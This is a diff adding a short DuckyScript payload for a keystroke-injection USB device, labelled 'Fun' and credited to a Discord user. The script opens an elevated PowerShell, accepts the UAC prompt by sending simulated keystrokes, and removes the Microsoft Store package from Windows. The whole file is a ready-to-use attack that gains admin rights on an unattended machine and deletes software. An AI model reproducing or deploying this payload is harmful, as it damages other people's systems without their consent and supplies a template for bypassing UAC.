@@ -1,0 +1,22 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Deletes the Microsoft Store 
+REM Version: 1.0
+REM Category: Fun
+DELAY 500
+GUI r
+DELAY 300
+REM Start PowerShell as Admin
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 300
+ENTER
+DELAY 500
+LEFTARROW
+DELAY 450
+ENTER
+DELAY 600
+REM Deletes Microsoft Store
+STRING Get-AppxPackage *windowsstore*|Remove-AppxPackage
+DELAY 200
+ENTER
+
+
